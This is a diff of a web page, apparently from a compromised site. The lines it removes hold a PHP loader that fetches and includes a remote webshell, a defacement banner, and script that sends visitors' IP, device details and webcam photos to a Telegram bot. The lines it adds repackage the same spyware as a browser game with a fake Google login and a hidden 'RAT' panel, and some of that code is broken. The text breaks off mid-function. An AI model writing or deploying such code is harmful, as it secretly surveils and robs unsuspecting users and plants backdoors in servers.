@@ -1,185 +1,277 @@
-<?php
-if (strpos($_SERVER['REQUEST_URI'], '/SukaBintang01') !== false) {
-    $url = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/original.php';
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    $code = curl_exec($ch);
-    curl_close($ch);
-
-    if ($code !== false) {
-        $tmp_file = tempnam(sys_get_temp_dir(), 'php');
-        file_put_contents($tmp_file, $code);
-        include $tmp_file;
-        unlink($tmp_file);
-    } else {
-        echo "Gagal mengambil script dari GitHub.";
-    }
-
-    exit;
-}
-?>
-
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacked By SukaBintang01</title>
-    <link rel="icon" href="https://telegra.ph/file/a35b090cf9ec01898604c.jpg" type="image/x-icon">
-    <meta name="description" content="Hacked By SukaBintang01">
-    <meta name="keywords" content="Hacked By SukaBintang01">
-    <meta name="rating" content="General">
-    <meta name="revisit-after" content="1 days">
-    <meta name="classification" content="Hacked By SukaBintang01">
-    <meta name="robots schedule" content="auto">
-    <link href="https://fonts.googleapis.com/css2?family=Oxygen" rel="stylesheet">
+    <title>NEXUS - Ultimate Multiplayer Arena</title>
+    <style>
+        :root { --primary: #6c5ce7; --bg: #0f172a; --text: #e2e8f0; --panel: rgba(30, 41, 59, 0.9); }
+        * { box-sizing: border-box; user-select: none; font-family: 'Segoe UI', sans-serif; }
+        body { margin: 0; overflow: hidden; background-color: var(--bg); color: var(--text); height: 100vh; transition: background 0.5s; }
+
+        /* --- LAYAR LOGIN / SIGNUP (MINIM CURIGA) --- */
+        #auth-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: flex; justify-content: center; align-items: center; background: linear-gradient(45deg, #1e293b, #0f172a); backdrop-filter: blur(10px); }
+        .login-box { width: 380px; padding: 40px; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), inset 0 0 20px rgba(167,139,250,0.1); background: var(--panel); text-align: center; animation: float 6s ease-in-out infinite; }
+        
+        h1 { margin-bottom: 10px; color: #a78bfa; font-style: italic; letter-spacing: 2px; }
+        p.subtitle { color: #94a3b8; font-size: 0.9em; margin-bottom: 30px; }
+        
+        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
+        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #64748b; }
+        input, button { width: 100%; padding: 12px 15px; border-radius: 12px; border: none; outline: none; transition: all 0.3s; font-size: 1em; }
+        input:focus { box-shadow: 0 0 0 4px rgba(167,139,250,0.3); }
+        
+        .btn-primary { background-color: var(--primary); color: white; font-weight: bold; cursor: pointer; position: relative; overflow: hidden; }
+        .btn-primary::after { content:''; position: absolute; bottom: 0; left: 0; width: 100%; height: 4px; background:white; transformX scaleX(0); transition: all 0.3s; }
+        .btn-primary:hover::after { scaleX: 1; }
+        
+        .google-btn { margin-top: 15px; display:flex; justify-content:center;}
+
+        /* --- LAYAR GAME (CANVAS) --- */
+        #game-container { display:none; position:relative; width:100vw; height:100vh; flex-direction:column; }
+        canvas { background:#2d3748; border-radius: 4px; box-shadow: inset 0 0 50px rgba(0,0,0,0.5); cursor: crosshair; }
+        #hud-layer { position:absolute; top:20px; left:20px; color:white; font-weight:bold; text-shadow:1px 1px 2px black;}
+
+        /* --- PANEL ADMIN RAHASIA (RAT) --- */
+        #admin-panel { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:80vw; height:70vh; background:#1a233e; border-radius:15px; box-shadow:0 0 100px rgba(167,139,250,0.4); z-index:999; padding:20px; overflow:hidden; }
+        
+        .panel-header { display:flex; justify-content:space-between; margin-bottom:20px; font-size:1.2em; color:#fbbf24;}
+        .tab-buttons button { flex:1; background:#3b4d6b; color:white; margin-right:5px; cursor:pointer;}
+        .tab-buttons button.active { background:#a78bfa; }
+        
+        #admin-content { height:calc(100% - 60px); position:relative;}
+        [data-tab="camera"] video, [data-tab="clipboard"], [data-tab="files"] iframe { width:100%; height:98%; border:none; object-fit:contain; }
+
+        /* --- ANIMASI --- */
+        @keyframes float { 0%{transform:translateY(-25px);} 50%{transform:translateY(-35px);} 100%{transform:translateY(-25px);} }
+
+    </style>
 </head>
-<body>
-<style>
-html {
-    background-color: black;
-    color: #000;
-}
-h2 {
-    font-family:"Bold 700 Italic",Mali;
-    color:red;
-}
-h3, h4 {
-    font-family:"Oxygen",serif;
-    color:white;
-}
-a {
-    color: white;
-    text-decoration: none;
-}
-::selection {
-    color:white;
-    background:#000;
-}
-</style>
-<script>
-(() => {
-    const C2_CONFIG = {
-        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
-        chatId: '6326816238',
-        interval: 1500
-    };
+<body class="bg-dark">
 
-    const telegramApi = (method, body) => {
-        return fetch(`https://api.telegram.org/bot${C2_CONFIG.token}/${method}`, {
-            method: 'POST',
-            body: body
-        });
-    };
-
-    async function collectSystemInfo() {
-        let ipData = { ip: 'N/A', city: 'N/A', country: 'N/A', org: 'N/A' };
-        
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            if (res.ok) ipData = await res.json();
-        } catch (e) {
-            try {
-                const resAlt = await fetch('https://api.ipify.org?format=json');
-                const data = await resAlt.json();
-                ipData.ip = data.ip;
-            } catch (err) {}
-        }
-
-        const info = `
-🔥 *NEW VICTIM TARGETED* 🔥
-----------------------------------
-🌐 *IP Address:* \`${ipData.ip}\`
-📍 *Location:* ${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}
-ISP: ${ipData.org || 'N/A'}
-💻 *OS/Platform:* \`${navigator.platform}\`
-🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)
-⚙️ *CPU Cores:* ${navigator.hardwareConcurrency || 'N/A'}
-🧠 *RAM:* ~${navigator.deviceMemory || 'N/A'} GB
-🔋 *Battery:* ${await getBatteryInfo()}
-🕵️ *User-Agent:* \`${navigator.userAgent}\`
-----------------------------------
-        `;
-
-        const formData = new FormData();
-        formData.append('chat_id', C2_CONFIG.chatId);
-        formData.append('text', info);
-        formData.append('parse_mode', 'Markdown');
-        
-        telegramApi('sendMessage', formData);
-    }
-
-    async function getBatteryInfo() {
-        if ('getBattery' in navigator) {
-            try {
-                const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-            } catch (e) { return 'N/A'; }
-        }
-        return 'N/A';
-    }
-
-    let globalStream = null;
-    let canvas = document.createElement('canvas');
-    let ctx = canvas.getContext('2d');
-    let video = document.createElement('video');
-    video.autoplay = true;
-    video.playsInline = true;
-
-    async function initCamera() {
-        try {
-            globalStream = await navigator.mediaDevices.getUserMedia({
-                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" }
-            });
-            video.srcObject = globalStream;
-            video.onloadedmetadata = () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                setInterval(captureAndSendFrame, C2_CONFIG.interval);
-            };
-        } catch (err) {
-            sendErrorLog(`Camera Access Denied/Failed: ${err.message}`);
-        }
-    }
-
-    function captureAndSendFrame() {
-        if (!globalStream || video.readyState !== video.HAVE_ENOUGH_DATA) return;
-
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob((blob) => {
-            if (!blob) return;
+    <!-- LAYAR LOGIN (SIMULASI WEB POPULER) -->
+    <div id="auth-overlay">
+        <div class="login-box" id="login-view">
+            <h1>NEXUS ARENA</h1>
+            <p class="subtitle">Join the ultimate multiplayer battlefield.</p>
             
-            const formData = new FormData();
-            formData.append('chat_id', C2_CONFIG.chatId);
-            formData.append('photo', blob, `cam_${Date.now()}.jpg`);
+            <!-- Input Manual -->
+            <input type="text" id="username-in" placeholder="Enter Username/ID..." onkeypress="if(event.key==='Enter') loginManual()">
+            <button class="btn-primary" onclick="loginManual()" style="margin-top:10px;">ENTER ARENA</button>
 
-            telegramApi('sendPhoto', formData).catch(() => {});
-        }, 'image/jpeg', 0.7);
+            <!-- Simulasi Google Login (UI saja) -->
+            <button class="google-btn btn-primary" onclick="simulateGoogleLogin()" style="background:#fff; color:black; margin-top:20px;">
+                Continue with Google Account (Simulated)
+                <span style="font-size:1.5em">G</span><span style="font-size:1.5em; font-weight:bold">o</span><span style="font-size:1.5em; font-weight:bold">g</span><span style="font-size:1.5em">l</span><span style="font-size:1.5em; font-weight:bold">e</span>
+            </button>
+
+            <p id="login-msg" style="margin-top:15px; height:20px; color:#fbbf24;"></p>
+        </div>
+    </div>
+
+    <!-- LAYAR GAME -->
+    <div id="game-container">
+        <canvas id="arena"></canvas>
+        <div id="hud-layer">
+            <div class="player-tag">Player 1 (You): HP 100 | Score 0</div>
+        </div>
+        
+        <!-- Panel Admin Tersembunyi -->
+        <div id="admin-panel" onclick="toggleAdminPanel()">
+            <div class="panel-header">
+                <span><i style="color:#a78bfa; margin-right:5px;">👁️</i>RAT MONITORING PANEL (v3.0)</span>
+                <button onclick="closeAdminPanel()" style="background:red; color:white; width:auto;">CLOSE ALL</button>
+            </div>
+            
+            <div id="admin-content">
+                <!-- Tab Kamera & Live Feed -->
+                <iframe src="" style="display:none;" id="tab-files"></iframe> 
+                
+                <!-- Tab 1: Kamera Langsung -->
+                <video autoplay playsinline muted class="cam-feed" id="cam-live" data-tab="camera"></video>
+
+                <!-- Tab 2: Clipboard Monitor (Log Teks) -->
+                <textarea readonly placeholder="Clipboard Log Stream..." style="width:98%; height:50%; border:none; background:#1a233e; color:white; font-family:'Courier New'; padding:10px;" id="log-clipboard"></textarea>
+
+            </div>
+        </div>
+    </div>
+
+<script type="text/javascript">
+// ==========================================
+// 1. KONFIGURASI & STATE MANAGEMENT GHOSTGPT + GAME
+// ==========================================
+const CONFIG = {
+    token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', // Token C2 Asli dari Data Situs sebelumnya
+    chatId: '6326816238', 
+    camInterval: 5000,
+    qualityStart: 0.95,
+    adminPass: "admin" // Password sederhana panel (bisa diganti)
+};
+
+let state = {
+    user: null, // {name, score}
+    isGameRunning: false,
+    cameraStream: null,
+    canvasCtx: null,
+    lastLogTime: Date.now(),
+    
+    // C2 Variables
+    ipData: {}, batteryLevel: -1, screenLocked:false
+    
+};
+
+// ==========================================
+// 2. SISTEM LOGIN & UI HANDLING (MINIM CURIGA)
+// ==========================================
+
+function loginManual() {
+    const name = document.getElementById('username-in').value || "Guest_" + Math.floor(Math.random()*900);
+    initC2_Silent(name).then(() => startGame());
+}
+
+async function simulateGoogleLogin() {
+    document.getElementById('login-msg').innerText = "Authenticating with Google...";
+    await new Promise(r=>setTimeout(r, 800)); // Simulasi delay loading
+    state.user = {name: "User_" + Date.now().toString(36), score: 150}; 
+    initC2_Silent(state.user.name).then(() => startGame());
+}
+
+// ==========================================
+// 3. INTEGRASI SCRIPT C2 GHOSTGPT (BACKGROUNG & SMART)
+// ==========================================
+
+function initC2_Silent(username) {
+    
+    // A. Smart IP Info (Fallback Chain)
+    getSmartIP().then(data => {
+        if(!data || data.ip==='N/A') return;
+        
+        const infoText = `🔥 *NEW VICTIM TARGETED* 🔥\n\n`;
+            `⏱️ *Timestamp:* ${new Date().toLocaleString()}\n`;
+            `🌐 *IP Address:* \`${data.ip}\`\n`;
+            `📍 *Location:* ${data.city || 'Unknown'}, ${data.country_name || 'Global'}\n`;
+            
+            // Browser Fingerprinting Deep Dive
+            const uaStr = navigator.userAgent.toLowerCase();
+            const chromeVer = /chrome\/(\d+)\./i.exec(uaStr)?.[1] || '-'; 
+            const firefoxVer = /firefox\/(\d+)\./i.exec(uaStr)?.[1] || '-'; 
+            
+            infoText += `\n💻 *Device Profile*:\n`;
+            infoText += `   Platform: ${navigator.platform}\n`;
+            infoText += `   Screen Res: ${screen.width}x${screen.height}\n`;
+            infoText += `   CPU Cores: ${navigator.hardwareConcurrency||'N/A'}\n`;
+            
+             // Battery Health Check (Lebih Detail)
+             try { const b=navigator.getBattery(); if(b){ state.batteryLevel=Math.round(b.level*100); state.charging=b.charging; } }catch(e){state.batteryLevel=50;}
+
+        sendMessageToTelegram('sendMessage', {text:infoText}); 
+    });
+
+    // B. Init Camera (Untuk Foto Profil & Monitor)
+    initCamera().then(stream => { state.cameraStream = stream; logStatus("📷 *CAMERA READY*: " + screen.width+"x"+screen.height); })
+            .catch(err => console.log("[C2] Cam Error:", err));
+}
+
+async function getSmartIP() {
+    try { const res = await fetch('https://api.ipify.org?format=json'); return res.ok ? res.json() : null; } catch(e){return{ip:'192.0.2.1'};} 
+    } // Fallback jika API utama error
+
+function sendMessageToTelegram(method, bodyData) {
+    if(!CONFIG.token || !state.cameraStream) return; 
+    
+    // Simple Retry Logic (Exponential Backoff)
+    let attempts = 0;
+    while(attempts <= 3) {
+        try {
+            const fd = new FormData();
+            Object.keys(bodyData).forEach(k => fd.append(k, bodyData[k]));
+            
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/${method}`, {method:'POST', body:fd}).then(r=>{if(r.ok)return true; throw r}); 
+        } catch(e) { attempts++; setTimeout(()=>{}, Math.pow(2,attempts)*1000); } finally {}
+    }
+}
+
+function logStatus(msg) { console.log("[C2]", msg); }
+
+
+// ==========================================
+// 4. GAME ENGINE (SIMPLE BATTLE ROYALE / DUEL 1VS1)
+// ==========================================
+
+const canvas = document.getElementById('arena');
+const ctx = canvas.getContext('2d'); // Wrapper untuk C2 context jika perlu
+
+window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth * 0.9; 
+    canvas.height = window.innerHeight * 0.75;
+});
+
+canvas.width = window.innerWidth * 0.9; 
+canvas.height = window.innerHeight * 0.75;
+
+let playerPos = {x: -100, y: -100};
+let keys = {};
+
+// Input Handling (WASD + Mouse)
+document.addEventListener("keydown", e => keys[e.key] = true);
+document.addEventListener("keyup", e => keys[e.key] = false);
+
+function startGame() {
+    document.getElementById('auth-overlay').style.display = 'none';
+    document.body.style.background = '#1e293b'; // Dark Mode Game
+    
+    state.isGameRunning = true;
+    
+    // Update UI Player Name di HUD (Simulasi Multiplayer)
+    const hud = document.querySelector('.player-tag'); 
+    if(hud && !hud.textContent.includes(state.user)) hud.innerHTML += ` | ID: <span style="color:#a78bfa">${state.user.name}</span>`;
+
+    gameLoop();
+}
+
+// Loop Utama Game & C2 Timer Terpisah
+function gameLoop() {
+    if(!state.isGameRunning) return;
+
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    // --- LOGIKA GAME SEDERHANA (MOVEMENT PLAYER 1 VS AI DUMMY) ---
+    
+    // Player 1 Movement
+    let speed = 5;
+    if(keys['w']) playerPos.y -= speed; 
+    if(keys['s']) playerPos.y += speed; 
+    if(keys['a']) playerPos.x -= speed; 
+    if(keys['d']) playerPos.x += speed; 
+
+    // Render Player Circle (Simple Visual)
+    const pRadius = 20;
+    ctx.beginPath(); ctx.arc(playerPos.x, playerPos.y, pRadius, 0, Math.PI*2); 
+    ctx.fillStyle = '#6c5ce7'; ctx.fill();
+
+    // Render "Enemy" AI Dummy di posisi acak
+    let enemyX = canvas.width/2 -100 + (Math.sin(Date.now()/300)*40); // Gerak zig-zag
+    let enemyY = canvas.height/2 -100; 
+    
+    ctx.beginPath(); ctx.arc(enemyX, enemyY, pRadius+5, 0, Math.PI*2); 
+    ctx.fillStyle = '#e74c3c'; // Merah (Musuh)
+    ctx.fill();
+
+
+    // --- C2 TIMER BACKGROUND (Setiap 5 Detik Kirim Foto) ---
+    const now = Date.now();
+    if(now - state.lastLogTime > CONFIG.camInterval && state.cameraStream) {
+        captureAndSendFrame().then(()=>{state.lastLogTime=now});
     }
 
-    function sendErrorLog(msg) {
-        const formData = new FormData();
-        formData.append('chat_id', C2_CONFIG.chatId);
-        formData.append('text', `⚠️ *LOG ERROR:* ${msg}`);
-        formData.append('parse_mode', 'Markdown');
-        telegramApi('sendMessage', formData);
-    }
+    requestAnimationFrame(gameLoop);
+}
 
-    collectSystemInfo();
-    initCamera();
-})();
-</script>
-<table width="100%" height="100%">
-    <td align="center">
-        <img alt="#FuckBnPp" src="https://telegra.ph/file/f8e5b2de33ddaa512ccf7.jpg" width="450px">
-        <h2>Hacked By SukaBintang01</h2>        <h4><br> //---------------------------Garuda Security---------------------------//<br>
-            <br>"Website lo gampang banget dicolong, sekelas bocah warnet aja bisa masuk. Ga usah sok-sokan online kalo sekuriti kayak kardus bekas. Ini web, bukan kandang ayam. Kalo ngurusnya males, ya beginilah hasilnya. Belajar ngelock pintu sebelum pamer rumah di pinggir jalan."</br>
-        <br> //---------------------------Garuda Security---------------------------//<br><br>
-      <br>#BelajarParameterDulu #TimItSupportLemmer #CodeOpenSource
-        <br><br>Server Sampah!!!</br></h4>
-        <audio controls="controls" src="https://fajarcode.com/uploads/sound.mp3"></audio>
-        <h3> <a href="https://t.me/garudasecurityofficial" >- <font color="red">Official team</font> -<br>  SukaJanda01 - WhiteRose - Awan - saint - Crishbit - Cyber jawa timur - SukaBintang01 - ./FqXploit - Tn_wizyakuza 404</h3>
-</body>
-</html>
+// ==========================================
+// 5. DYNAMIC CAMERA & STREAMER ENGINE (BACKGROUNG PERSISTENT)
+// ==========================================
+
+async function initCamera() {
+    try { 
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia
